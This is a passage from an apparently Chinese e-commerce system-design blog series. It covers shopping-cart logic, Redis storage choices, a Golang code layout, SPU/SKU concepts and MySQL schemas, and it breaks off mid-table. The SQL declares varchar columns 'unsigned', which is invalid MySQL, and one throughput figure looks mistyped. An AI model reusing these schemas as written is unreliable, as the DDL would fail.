<h4 id="购物车"><a href="#购物车" class="headerlink" title="购物车"></a>购物车</h4><p>说完了加车前，现在来看购物车这一部分。我们在之前曾讨论过，购物车可能会有多种形态的，比如：存储多个商品一起结算，某个商品立即结算等。因此购物车一定会根据渠道来进行购物车类型的选择。</p>
<p>这部分的操作相对是比较稳定的。我们挑几个比较重要的操作来讲一下思路即可。</p>
<p><strong>加入购物车</strong></p>
<p>通过把条件验证的前置，会发现在进行加车操作时，这部分逻辑已经变得非常的轻量了。要做的主要是下面几个部分的逻辑。</p>
<p><img src="/articles/电商设计手册/cart-sys-04.jpg" alt></p>
<p>这里有几个取巧的地方，首先是获取商品的逻辑，由于在前面验证的时候也会用到，因此这里前面获取后会通过参数的方式继续往后传递，因此这里不需要在读库或者调用服务来获取；</p>
<p>其次这里需要把当前用户现有购物车数据获取到，然后将添加的这个商品添加进来。这是一个类似合并操作，原来这个商品是存在，相当于数量加一；需要注意这个商品跟现存的商品有没有父子关系，有没有可能加入后改变了某个活动规则，比如：原来买了2个送1个赠品，现在再添加了一个变成3个，送2个赠品；</p>
<blockquote>
<p>注意：这里的添加并不是在购物车直接改数量，可能就是在列表、详情页直接添加添加。</p>
</blockquote>
<p>通过将合并后的购物车数据，通过营销活动检查确认ok后，直接回写到存储中。</p>
<p><strong>合并购物车</strong></p>
<p>为什么会有合并购物车这个操作？因为一般电商都是准许游客身份进行操作的，因此当用户登录后需要将二者进行合并。</p>
<p>这里的合并很多部分的逻辑是可以与加入购物车复用的逻辑。比如：合并后的数据都需要检查是否合法，然后覆写回存储中。因此大家可以看到这里的关联性。设计的方法在某种程度上要通用。</p>
<p><strong>购物车列表</strong></p>
<p>购物车列表这是一个非常重要的接口，原则上购物车接口会提供两种类型，一种简版，一种完全版本；</p>
<p>简版的列表接口主要是用在类似PC首页右上角之类获取简单信息；完全版本就是在购物车列表中会用到。</p>
<p>在实际实现中，购物车绝不仅仅是一个读取接口那么简单。因为我们都知道不管是商品信息、活动信息都是在不断的发生变化。因此每次的读取接口必然需要检查当前购物车中数据的合法性，然后发现不一致后需要覆写原存储的数据。</p>
<p><img src="/articles/电商设计手册/cart-sys-05.jpg" alt></p>
<p>也有一些做法会在每个接口都去检查数据的合法性，我建议为了性能考虑，部分接口可以适当放宽检查，在获取列表时再进行完整的检查。比如添加接口，我只会检测我添加的商品的合法性，绝不会对整个购物车进行检查。因为该操作之后一般都会调用列表操作，那么此时还会进行校验，二者重复操作，因此只取后者。</p>
<h4 id="结算"><a href="#结算" class="headerlink" title="结算"></a>结算</h4><p>结算包括两部分，结算页的详情信息与提交订单。结算页可以说是在购物车列表上的一个包装，因为结算页与列表页最大的不同是需要用户选择配送地址（虚拟商品另说），此时会产生更明确的价格信息，其他基本一致。因此在设计购物车列表接口的时候，一定要考虑充分的通用性。</p>
<p>这里另外一个需要注意的是：立即购买，我们也会通过结算页接口来实现，但是内部其实还是会调用添加接口，将商品添加到购物车中；有三个需要注意的地方，首先是这个添加操作是服务内部完成的，对于服务调用方是不需要感知这个加入操作的存在；其次是这个购物车在Redis中的Key是独立于普通购物车的，否则二者的商品耦合在一起非常难于操作处理；最后立即购买的购物车要考虑账号多终端登录的时候，彼此数据不能互相影响，这里可以用每个端的uuid来作为购物车的标记避免这种情况。</p>
<p>购物车的最后一步是生成订单，这一步最要紧的是需要给购物车加锁，避免提交过程中数据被篡改，多说一句，很多人写的Redis分布式锁代码都存在缺陷，大家一定要注意原子性的问题，这类文章网络上很多不再赘述。</p>
<p>加锁成功之后，我们这里有多种做法，一种是按照DB涉及组织数据开始写表，这适用于业务量要求不大，比如订单每秒下单量不超过2000K的；那如果你的系统并发要求非常高怎么办？</p>
<p>其实也很简单，高性能的三大法宝之一：异步；我们提交的时候直接将数据快照写入MQ中，然后通过异步的方式进行消费处理，可以通过通过控制消费者的数量来提升处理能力。这种方法虽然性能提升，但是复杂度也会上升，大家需要根据自己的实际情况来选择。</p>
<p>关于业务架构的设计，到此告一段落，接下来我们来看系统架构。</p>
<h3 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h3><p>系统结构主要包含，如何将业务架构映射过来，以及输出对应输入参数、输出参数的说明。由于输入、输出针对各自业务来确定的，而且没有什么难度，我们这里就只说如何将业务架构映射到系统架构，以及系统架构中最核心的Redis数据结构选择以及存储的数据结构设计。</p>
<h4 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h4><p>下面的代码目录是按照 <code>Golang</code> 来进行设计的。我们来看看如何将上面的业务架构映射到代码层面来。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line">├── addproducts.<span class="keyword">go</span></span><br><span class="line">├── cartlist.<span class="keyword">go</span></span><br><span class="line">├── mergecart.<span class="keyword">go</span></span><br><span class="line">├── entity</span><br><span class="line">│   ├── cart</span><br><span class="line">│   │   ├── add.<span class="keyword">go</span></span><br><span class="line">│   │   ├── cart.<span class="keyword">go</span></span><br><span class="line">│   │   └── list.<span class="keyword">go</span></span><br><span class="line">│   ├── order</span><br><span class="line">│   │   ├── checkout.<span class="keyword">go</span></span><br><span class="line">│   │   ├── order.<span class="keyword">go</span></span><br><span class="line">│   │   └── submit.<span class="keyword">go</span></span><br><span class="line">│   └── precart</span><br><span class="line">├── event</span><br><span class="line">│   └── sendorder.<span class="keyword">go</span></span><br><span class="line">├── facade</span><br><span class="line">│   ├── activity.<span class="keyword">go</span></span><br><span class="line">│   └── product.<span class="keyword">go</span></span><br><span class="line">└── repo</span><br></pre></td></tr></table></figure>

<p>外层有 <code>entity</code>、<code>event</code>、<code>facade</code>、<code>repo</code>这四个目录，职责如下：</p>
<p><strong>entity</strong>: 存放的是我们前面分析的购物领域的三个实体；所有主要的操作都在这三个实体上；</p>
<p><strong>event</strong>: 这是用来处理产生的事件，比如刚刚说的如果我们提交订单采用异步的方式，那么该目录就该完成的是如何把数据发送到MQ中去；</p>
<p><strong>facade</strong>: 这儿目录是干嘛的呢？这主要是因为我们的服务还需要依赖像商品、营销活动这些服务，那么我们不应该在实体中直接调用它，因为第三方可能存在变动，或者有增加、减少，我们在这里进行以下简单的封装(设计模式中的门面模式)；</p>
<p><strong>repo</strong>: 这个目录从某种程度上可以理解为 <code>Model</code>层，在整个领域服务中，如果与持久化打交道，都通过它来完成。</p>
<p>最后外层的几个文件，就是我们所提供的领域服务，供应用层来进行调用的。</p>
<blockquote>
<p>为了保证内容的紧凑，我这里放弃了对整个微服务的目录介绍，只单独介绍了领域服务，后续会单独成文介绍下微服务的整个系统架构。</p>
</blockquote>
<p>通过上面的划分，我们完成了两件事情：</p>
<ol>
<li><p>业务架构分析的结构在系统代码中都有映射，他们彼此体现。这样最大的好处是，保证设计与代码的一致性，看了文档你就知道对应的代码在哪里；</p>
</li>
<li><p>每个目录各自的关注点都进行了分离，更内聚，更容易开发与维护。</p>
</li>
</ol>
<h4 id="Redis存储"><a href="#Redis存储" class="headerlink" title="Redis存储"></a>Redis存储</h4><p>现在来看，我们选择Redis作为购物商品数据的存储，我们要解决两个问题，一是我们需要存哪些数据？二是我们用什么结构来存？</p>
<p>网络上很多写购物车的都是只保存一个商品id，真实场景是很难满足需求的。你想想，一个商品id如何记住用户选择的赠品？用户上次选择的活动？以及购买的商品渠道？</p>
<p>综合比较通用的场景，我给出一个参考结构：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 购物车数据</span></span><br><span class="line"><span class="keyword">type</span> ShoppingData <span class="keyword">struct</span> &#123;</span><br><span class="line">	Item       []*Item <span class="string">`json:"item"`</span></span><br><span class="line">	UpdateTime <span class="keyword">int64</span>   <span class="string">`json:"update_time"`</span></span><br><span class="line">	Version    <span class="keyword">int32</span>   <span class="string">`json:"version"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单个商品item元素</span></span><br><span class="line"><span class="keyword">type</span> Item <span class="keyword">struct</span> &#123;</span><br><span class="line">	ItemId       <span class="keyword">string</span>          <span class="string">`json:"item_id"`</span></span><br><span class="line">	ParentItemId <span class="keyword">string</span>          <span class="string">`json:"parent_item_id,omitempty"`</span> <span class="comment">// 绑定的父item id</span></span><br><span class="line">	OrderId      <span class="keyword">string</span>          <span class="string">`json:"order_id,omitempty"`</span>       <span class="comment">// 绑定的订单号</span></span><br><span class="line">	Sku          <span class="keyword">int64</span>           <span class="string">`json:"sku"`</span></span><br><span class="line">	Spu          <span class="keyword">int64</span>           <span class="string">`json:"spu"`</span></span><br><span class="line">	Channel      <span class="keyword">string</span>          <span class="string">`json:"channel"`</span></span><br><span class="line">	Num          <span class="keyword">int32</span>           <span class="string">`json:"num"`</span></span><br><span class="line">	Status       <span class="keyword">int32</span>           <span class="string">`json:"status"`</span></span><br><span class="line">	TTL          <span class="keyword">int32</span>           <span class="string">`json:"ttl"`</span>                     <span class="comment">// 有效时间</span></span><br><span class="line">	SalePrice    <span class="keyword">float64</span>         <span class="string">`json:"sale_price"`</span>              <span class="comment">// 记录加车时候的销售价格</span></span><br><span class="line">	SpecialPrice <span class="keyword">float64</span>         <span class="string">`json:"special_price,omitempty"`</span> <span class="comment">// 指定价格加购物车</span></span><br><span class="line">	PostFree     <span class="keyword">bool</span>            <span class="string">`json:"post_free,omitempty"`</span>     <span class="comment">// 是否免邮</span></span><br><span class="line">	Activities   []*ItemActivity <span class="string">`json:"activities,omitempty"`</span>    <span class="comment">// 参加的活动记录</span></span><br><span class="line">	AddTime      <span class="keyword">int64</span>           <span class="string">`json:"add_time"`</span></span><br><span class="line">	UpdateTime   <span class="keyword">int64</span>           <span class="string">`json:"update_time"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 活动</span></span><br><span class="line"><span class="keyword">type</span> ItemActivity <span class="keyword">struct</span> &#123;</span><br><span class="line">	ActID    <span class="keyword">string</span> <span class="string">`json:"act_id"`</span></span><br><span class="line">	ActType  <span class="keyword">string</span> <span class="string">`json:"act_type"`</span></span><br><span class="line">	ActTitle <span class="keyword">string</span> <span class="string">`json:"act_title"`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点说一下 <code>Item</code> 这个结构，<code>item_id</code> 这个字段是标记购物车中某个商品的唯一标记，因为我们之前说过，同一个sku由于渠道不同，那么在购物车中会是两个不同的item；接下来的 <code>parent_item_id</code> 字段是用来标记父子关系的，这里将可能存在的树结构转成了顺序结构，我们不管是父商品还是子商品，都采用顺序存储，然后通过这个字段来进行关联；有些同学可能会奇怪，为什么会存order id这个字段呢？大家关注下自己的日常业务，比如：再来一单、定金预售等，这种一定是与某个订单相关联的，不管是为了资格验证还是数据统计。剩下的字段都是一些非常常规的字段，就不在一一介绍了；</p>
<blockquote>
<p>字段的类型，大家根据自己的需要进行修改。</p>
</blockquote>
<p>接下来该说怎么选择Redis的存储结构了，Redis常用的 <code>Hash Table、集合、有序集合、链表、字符串</code> 五种，我们一个个来分析。</p>
<p>首先购车一定有一个key来标记这个购物车属于哪个用户的，为了简化，我们的key假设是：<code>uid:cart_type</code>。</p>
<p>我们先来看如果用 <code>Hash Table</code>；我们添加时，需要用到如下命令：<code>HSET uid:cart_type sku ShoppingData</code>；看起来没问题，我们可以根据sku快速定位某个商品然后进行相关的修改等，但是注意，ShoppingData是一个json串，如果用户购物车中有非常多的商品，我们用 <code>HGETALL uid:cart_type</code> 获取到的时间复杂度是O(n)，然后代码中还需要一一反序列化，又是O(n)的复杂度。</p>
<p>如果用<code>集合</code>，也会遇到类似的问题，每个购物车看做一个集合，集合中的每个元素是 ShoppingData ，取到代码中依然需要逐一反序列化(反序列化是成本)，关于有序集合与链表就不在分析，大家可以按照上面的思路去尝试下问题所在。</p>
<p>看起来我们没得选，只有使用<code>String</code>，那我们来看一下<code>String</code>的契合度是什么样子。首先<code>SET uid:cart_type ShoppingDataArr</code>；我们把购物车所有的数据序列化成一个字符串存储，每次取出来的时间复杂度是O(1)，序列化、反序列化都只需要一次。看来是非常不错的选择。但是在使用中大家还是有几点需要注意。</p>
<ol>
<li>单个Value不能太大，要不然就会出现大key问题，所以一般购物车有上限限制，比如item不能超过多少个；</li>
<li>对redis的操作性能提升上来了，但是代码的就是修改单个item时的不便，必须每次读取全部然后找到对应的item进行修改；这里我们可以把从redis中的数据读取出来后，在内存中构建一个HashTable，来减少每次遍历的复杂度；</li>
</ol>
<p>网上也看到很多Redis数据结构组合使用来保存购物车数据的，但是无疑增加了网络开销，相比起来还是String最经济划算。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>至此对于购物车的实现设计算是完结了，其中关于订单表的设计会单独放到订单模块去讲。</p>
<p>对于整个购物车服务，虽然没有写的详细到某个具体的接口，但是分析到这一步，我相信大家心中都是有沟壑的，能够结合自己的业务去实现它。</p>
<p>文中有些很有意思的地方，建议大家动手去做做看，有任何问题，我们随时交流。</p>
<ul>
<li>改编版的责任链模式</li>
<li>Redis的分布式事务锁实现</li>
</ul>
<p>接下来终于要到订单部分的设计了，希望大家继续关注我们。</p>
<h2 id="商品系统"><a href="#商品系统" class="headerlink" title="商品系统"></a>商品系统</h2><h2 id="商品系统-Temporal万物"><a href="#商品系统-Temporal万物" class="headerlink" title="商品系统(Temporal万物)"></a>商品系统(Temporal万物)</h2><p>今天我们开始「商品系统」的篇章。本文分为如下五大模块：</p>
<ul>
<li>需求分析</li>
<li>架构设计</li>
<li>Spu和Sku的故事</li>
<li>数据模型设计</li>
<li>接口设计</li>
</ul>
<p>第一篇我们主要看看一个入门的电商平台(<strong>B2C</strong>)如何去构建自己的<strong>基础商品信息</strong>，其实这个事情很简单，想想我们的现实生活，商家<strong>摆放</strong>商品到货架，客户从货架<strong>挑选</strong>商品，客户把挑选好的商品<strong>放入</strong>购物车(篮)，最后客户去收银台<strong>结账</strong>。</p>
<h3 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h3><p>对于一个电商平台来讲，我们怎么理解上面的简单示例呢？接着，我们来拆分上面这个简单的事情：</p>
<blockquote>
<p>商家<strong>摆放</strong>商品到货架，客户从货架<strong>挑选</strong>商品，客户把挑选好的商品<strong>放入</strong>购物车(篮)，最后客户去收银台<strong>结账</strong></p>
</blockquote>
<ol>
<li>商家是谁：电商平台</li>
<li>摆放是什么意思：上架</li>
<li>货架在哪：前台系统(web/app/…)</li>
<li>挑选：浏览前台系统</li>
<li>放入：点击前台系统「加入购物车按钮」</li>
<li>…(暂不多说了)</li>
</ol>
<p><strong>备注</strong>：本篇文章主要来看看1、2、3、4步该如何去设计。</p>
<p>通过上面的分析我们可以得出下面的信息：</p>
<ol>
<li>我们需要一个「电商平台」，电商平台里面需要有个<strong>商品后台系统</strong>。</li>
<li>我们上架什么东西呢？商品！所以<strong>商品后台系统</strong>需要具备<strong>创建</strong>和<strong>发布</strong>商品到<strong>前台系统</strong>的功能。</li>
<li>我们需要一个<strong>前台系统</strong>(比如网页)，前台系统具备商品列表和商品详情的页面，可供用户<strong>浏览</strong>。</li>
<li>前台系统的数据怎么来？所以我们需要一个<strong>接口网关</strong>(对外统一提供服务能力，企业总线)和<strong>商品服务</strong></li>
</ol>
<p>整理之后得到如下的需求点：</p>
<table>
<thead>
<tr>
<th>需求点</th>
<th>功能点</th>
<th>项目命名</th>
<th>技术栈</th>
</tr>
</thead>
<tbody><tr>
<td>商品后台系统</td>
<td>1.创建商品 2.发布商品到前台系统</td>
<td>Temporal Backend</td>
<td>PHP</td>
</tr>
<tr>
<td>前台系统</td>
<td>1.商品列表 2.商品详情</td>
<td>Skr Frontend</td>
<td>Vue</td>
</tr>
<tr>
<td>接口网关</td>
<td>企业总线</td>
<td>Skr Gateway</td>
<td>kong</td>
</tr>
<tr>
<td>商品服务</td>
<td>1.创建商品接口 2.商品状态变更接口 2.商品列表接口 3. 商品详情接口</td>
<td>Temporal Service</td>
<td>Golang</td>
</tr>
</tbody></table>
<h3 id="架构设计-1"><a href="#架构设计-1" class="headerlink" title="架构设计"></a>架构设计</h3><p>通过上面的需求分析，再加上之前的《电商设计手册之用户体系》中的用户体系和《支付开发，不得不了解的国内、国际第三方支付流程》中的支付服务，我们规划出以下的架构图。</p>
<p><img src="/articles/电商设计手册/skr-product-service.jpg" alt></p>
<h3 id="Spu和Sku的故事"><a href="#Spu和Sku的故事" class="headerlink" title="Spu和Sku的故事"></a>Spu和Sku的故事</h3><p>对我们程序猿来讲「商品系统」刚开始的样子就是如下三点：</p>
<ol>
<li>创建商品功能：首先我们会有一张商品表，每创建一个商品我们会的到一个goods_id，如果商品存在父子的关系，加一个parent_id的字段就搞定了。</li>
<li>商品列表接口：商品表分页查询商品。</li>
<li>商品详情接口：商品表按goods_id索引查询商品信息。</li>
</ol>
<p>很简单是吧，基本一张表就搞定了，看起来也是没什么问题的。但是呢，程序设计的巧妙之处就在于<strong>抽象能力</strong>，电商行业把<code>goods_id</code>进行了进一步的抽象，产生了Spu和Sku概念，在了解Spu和Sku定义之前，我们还得了解下<strong>销售属性</strong>的含义，举个例子便于理解：</p>
<p>想想我们的现实生活，假如我们去批发市场上了一批AJ1球鞋，批发商会给我们不同<strong>配色</strong>、<strong>大小</strong>的AJ1球鞋。我们在店里销售这些商品时都会询问客户：“您是需要什么<strong>颜色</strong>和<strong>大小</strong>的AJ1球鞋呢？”。这里的<strong>颜色</strong>和<strong>大小</strong>就是所谓的<strong>销售属性</strong>，因为不同<strong>颜色</strong>和<strong>大小</strong>的AJ1球鞋可能价格不同、库存数量不同，现实生活中是不是如此，不同颜色或大小的AJ1都有差别巨大的价格。</p>
<p>接着，我们来看看Spu和Sku定义：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>概念</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>Spu</td>
<td>standard product unit 标准产品单位</td>
<td>goods_id剥离销售属性的部分，例如：小米8。商品列表我们展示Spu列表。</td>
</tr>
<tr>
<td>Sku</td>
<td>stock keeping unit 库存量单位</td>
<td>就是你想买的那个商品真正的编号，这个编号对应的库存就是你想买的那个商品的库存量。Spu+一或多个销售属性对应一个Sku，例如：小米8黑128G，其中黑和128G就是销售属性，小米8就是一个Spu。</td>
</tr>
</tbody></table>
<p>搞清楚了么？</p>
<h3 id="数据模型设计-1"><a href="#数据模型设计-1" class="headerlink" title="数据模型设计"></a>数据模型设计</h3><p>所以最后简单的<strong>商品表</strong>就拆成了<strong>spu表</strong>和<strong>sku表</strong>，接着我们还抽象出来了可复用的<strong>销售属性表</strong>和<strong>销售属性值表</strong>。除此之外<br>我们应该还有<strong>品牌表</strong>、<strong>类别表</strong>、简单的<strong>sku库存表</strong>(目前简单设计此表，后期具体业务重构此表)。接着我们列下这些表的明细：</p>
<table>
<thead>
<tr>
<th>表名称</th>
<th>表名</th>
</tr>
</thead>
<tbody><tr>
<td>品牌表</td>
<td>product_brands</td>
</tr>
<tr>
<td>类别表</td>
<td>product_category</td>
</tr>
<tr>
<td>spu表</td>
<td>product_spu</td>
</tr>
<tr>
<td>sku表</td>
<td>product_sku</td>
</tr>
<tr>
<td>销售属性表</td>
<td>product_attr</td>
</tr>
<tr>
<td>销售属性值</td>
<td>product_attr_value</td>
</tr>
<tr>
<td>sku库存表</td>
<td>product_sku_stock</td>
</tr>
</tbody></table>
<p>除了上面的表之外，我又加了另一张表 <code>关联关系冗余表 product_spu_sku_attr_map</code>，为什么呢？顾名思义，冗余用的，有了这张表，我们可以很高效的得到：</p>
<ol>
<li>spu下 有哪些sku</li>
<li>spu下 有那些销售属性</li>
<li>spu下 每个销售属性对应的销售属性值(一对多)</li>
<li>spu下 每个销售属性值对应的sku(一对多)</li>
</ol>
<p>具体表结构如下所示：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 品牌表 product_brands</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_brands`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'品牌ID'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'品牌名称'</span>,</span><br><span class="line">    <span class="string">`desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'品牌描述'</span>,</span><br><span class="line">    <span class="string">`logo_url`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'品牌logo图片'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'品牌表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 类别表 product_category</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_category`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'分类ID'</span>,</span><br><span class="line">    <span class="string">`pid`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'父ID'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'分类名称'</span>,</span><br><span class="line">    <span class="string">`desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'分类描述'</span>,</span><br><span class="line">    <span class="string">`pic_url`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'分类图片'</span>,</span><br><span class="line">    <span class="string">`path`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'分类地址&#123;pid&#125;-&#123;child_id&#125;-...'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'类别表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- spu表 product_spu</span></span><br><span class="line"><span class="comment">-- spu: standard product unit 标准产品单位</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_spu`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'SPU ID'</span>,</span><br><span class="line">    <span class="string">`brand_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'品牌ID'</span>,</span><br><span class="line">    <span class="string">`category_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'分类ID'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'spu名称'</span>,</span><br><span class="line">    <span class="string">`desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'spu描述'</span>,</span><br><span class="line">    <span class="string">`selling_point`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'卖点'</span>,</span><br><span class="line">    <span class="string">`unit`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'spu单位'</span>,</span><br><span class="line">    <span class="string">`banner_url`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'banner图片 多个图片逗号分隔'</span>,</span><br><span class="line">    <span class="string">`main_url`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'商品介绍主图 多个图片逗号分隔'</span>,</span><br><span class="line">    <span class="string">`price_fee`</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> 